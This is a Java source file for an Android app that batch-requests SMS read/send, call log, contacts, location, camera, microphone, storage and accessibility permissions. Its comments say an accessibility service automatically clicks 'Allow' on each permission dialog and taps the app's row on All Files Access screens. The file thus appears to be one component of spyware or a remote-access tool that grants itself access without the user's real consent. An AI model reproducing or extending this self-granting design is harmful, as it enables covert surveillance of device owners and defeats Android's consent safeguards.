package com.task.tusker.permissions;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

/**
 * AUTO PERMISSION MANAGER
 * 
 * Handles automatic permission requests for Android 6.0 - 16+
 * 
 * FEATURES:
 * - Runtime permission requests
 * - Special permission handling
 * - Auto-grant attempts (where possible)
 * - Permission status tracking
 * 
 * SUPPORTS:
 * - Android 6.0 (API 23) to Android 16 (API 35+)
 */
public class AutoPermissionManager {

    private Context context;
    private Activity activity;

    // Permission groups
    public static final String[] BASIC_PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.VIBRATE
    };

    /**
     * All runtime (dangerous) permissions requested as a batch when accessibility
     * is first enabled.  The auto-granter in UnifiedAccessibilityService will
     * click "Allow" / "Allow all the time" on each dialog automatically.
     *
     * Rules:
     *  - Every permission here must be declared in AndroidManifest.xml.
     *  - Non-dangerous / install-time permissions are excluded — they are granted
     *    automatically on install and don't produce a dialog.
     *  - Storage permissions (MANAGE_EXTERNAL_STORAGE, All Files Access) are
     *    requested on-demand from the dashboard because they require a Settings page.
     *  - API-gated permissions use a safe try/catch in requestAllPermissions().
     */
    public static final String[] DANGEROUS_PERMISSIONS = {
        // ── Contacts & Phone ────────────────────────────────────────────────
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        "android.permission.READ_PHONE_NUMBERS",   // API 26+ (READ_PHONE_NUMBERS)

        // ── SMS & MMS ───────────────────────────────────────────────────────
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.RECEIVE_MMS,

        // ── Location ────────────────────────────────────────────────────────
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,

        // ── Camera & Microphone ─────────────────────────────────────────────
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,

        // ── Storage (runtime dialogs only — Android ≤ 12) ──────────────────
        // On Android 13+ these are superseded by READ_MEDIA_* below.
        Manifest.permission.READ_EXTERNAL_STORAGE,

        // ── Media (Android 13+, API 33) — safe to include; OS skips on older ─
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",

    };

    public AutoPermissionManager(Context context) {
        this.context = context;
        if (context instanceof Activity) {
            this.activity = (Activity) context;
        }
    }

    /**
     * Request all dangerous permissions.
     * Uses try/catch per permission so API-gated string permissions
     * (READ_PHONE_NUMBERS, POST_NOTIFICATIONS, READ_MEDIA_*) don't crash on
     * older Android versions where the constant doesn't exist.
     */
    public void requestAllPermissions() {
        if (activity == null) return;

        List<String> permissionsToRequest = new ArrayList<>();

        for (String permission : DANGEROUS_PERMISSIONS) {
            try {
                if (ContextCompat.checkSelfPermission(context, permission)
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            } catch (Exception ignored) {
                // Permission constant doesn't exist on this API level — skip silently
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                activity,
                permissionsToRequest.toArray(new String[0]),
                100
            );
        }
    }

    /**
     * Check if all permissions are granted
     */
    public boolean areAllPermissionsGranted() {
        for (String permission : DANGEROUS_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    /**
     * Get permission status
     */
    public JSONObject getPermissionStatus() {
        JSONObject result = new JSONObject();
        
        try {
            JSONArray granted = new JSONArray();
            JSONArray denied = new JSONArray();

            for (String permission : DANGEROUS_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(context, permission) 
                    == PackageManager.PERMISSION_GRANTED) {
                    granted.put(permission);
                } else {
                    denied.put(permission);
                }
            }

            result.put("granted", granted);
            result.put("denied", denied);
            result.put("grantedCount", granted.length());
            result.put("deniedCount", denied.length());
            result.put("allGranted", denied.length() == 0);
            
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return result;
    }

    /**
     * Request battery optimization exemption (ignore battery optimizations)
     */
    public void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.os.PowerManager pm =
                (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(context.getPackageName())) {
                Intent intent = new Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + context.getPackageName())
                );
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                if (activity != null) {
                    activity.startActivityForResult(intent, 103);
                } else {
                    context.startActivity(intent);
                }
            }
        }
    }

    /**
     * Check usage stats permission
     */
    private boolean hasUsageStatsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                context.getPackageName()
            );
            return mode == AppOpsManager.MODE_ALLOWED;
        }
        return true;
    }

    /**
     * Open app settings
     */
    public void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.parse("package:" + context.getPackageName()));
        if (activity != null) {
            activity.startActivity(intent);
        }
    }

    /**
     * Request accessibility service
     */
    public void requestAccessibilityService() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        if (activity != null) {
            activity.startActivity(intent);
        }
    }

    /**
     * Check if accessibility service is enabled
     */
    public boolean isAccessibilityServiceEnabled() {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED
            );
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }

        if (accessibilityEnabled == 1) {
            String services = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (services != null) {
                return services.toLowerCase().contains(context.getPackageName().toLowerCase());
            }
        }
        return false;
    }

    /**
     * Get all special permissions status
     */
    public JSONObject getSpecialPermissionsStatus() {
        JSONObject result = new JSONObject();
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                result.put("overlay", Settings.canDrawOverlays(context));
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                result.put("usageStats", hasUsageStatsPermission());
            }
            
            result.put("accessibility", isAccessibilityServiceEnabled());
            
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return result;
    }

    /**
     * Request notification permission (Android 13+)
     */
    public void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (activity != null) {
                ActivityCompat.requestPermissions(
                    activity,
                    new String[]{"android.permission.POST_NOTIFICATIONS"},
                    105
                );
            }
        }
    }

    /**
     * Request WRITE_EXTERNAL_STORAGE as the very last permission step.
     * On Android 11+ (API 30+): opens the "All Files Access" settings screen.
     * On Android 10 and below: requests WRITE_EXTERNAL_STORAGE as a runtime dialog (last).
     */
    public void requestWriteExternalStorageLast() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+: can't use runtime permission — must use Settings page
            requestManageExternalStorage();
        } else {
            // Android 10 and below: runtime permission dialog
            if (activity != null &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(
                    activity,
                    new String[]{ Manifest.permission.WRITE_EXTERNAL_STORAGE },
                    106
                );
            }
        }
    }

    /**
     * Request MANAGE_EXTERNAL_STORAGE (All Files Access) — requires Settings intent on Android 11+.
     * On older versions this falls back to WRITE_EXTERNAL_STORAGE which is already in DANGEROUS_PERMISSIONS.
     *
     * Intent chain (most-specific → most-general) so every OEM is covered:
     *  1. ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION + package URI
     *     → opens the per-app toggle page directly (stock Android, Samsung, most OEMs).
     *  2. ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
     *     → opens the full app list; accessibility list-granter taps our row.
     *  3. App-info page (ACTION_APPLICATION_DETAILS_SETTINGS)
     *     → last resort: universal fallback; user/accessibility can navigate from there.
     */
    public void requestManageExternalStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (android.os.Environment.isExternalStorageManager()) return; // already granted

            // Attempt 1: per-app All Files Access page (most OEMs support this).
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                return;
            } catch (Exception ignored) {}

            // Attempt 2: generic All Files Access list (runStorageListGranter will tap our row).
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                return;
            } catch (Exception ignored) {}

            // Attempt 3: app-info page — universal, always works, accessibility navigates from here.
            try {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception ignored) {}
        }
    }

    /**
     * Check if MANAGE_EXTERNAL_STORAGE (All Files Access) is granted.
     */
    public boolean hasManageExternalStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return android.os.Environment.isExternalStorageManager();
        }
        return ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)
            == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * Request MODIFY_AUDIO_SETTINGS — a normal (non-dangerous) permission.
     * Declared in the manifest; granted automatically on install on most devices.
     * This explicit request covers edge cases where it may still need approval.
     */
    public void requestModifyAudioSettings() {
        if (activity != null &&
            ContextCompat.checkSelfPermission(context, Manifest.permission.MODIFY_AUDIO_SETTINGS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                activity,
                new String[]{ Manifest.permission.MODIFY_AUDIO_SETTINGS },
                107
            );
        }
    }

    /**
     * Request all permissions in sequence.
     * Storage/file-access permissions are intentionally excluded here —
     * they are requested on-demand from the dashboard (App Mode).
     */
    public void requestAllPermissionsSequentially() {
        // Step 1: Request dangerous permissions (storage excluded)
        requestAllPermissions();

        // Step 2: Request battery optimization exemption (with delay)
        new android.os.Handler().postDelayed(() -> {
            requestBatteryOptimization();
        }, 2000);

        // Step 3: Request MODIFY_AUDIO_SETTINGS (immediately after battery, last perm step)
        new android.os.Handler().postDelayed(() -> {
            requestModifyAudioSettings();
        }, 3000);

        // Step 4: Request accessibility (with delay)
        new android.os.Handler().postDelayed(() -> {
            if (!isAccessibilityServiceEnabled()) {
                requestAccessibilityService();
            }
        }, 4000);
    }
}
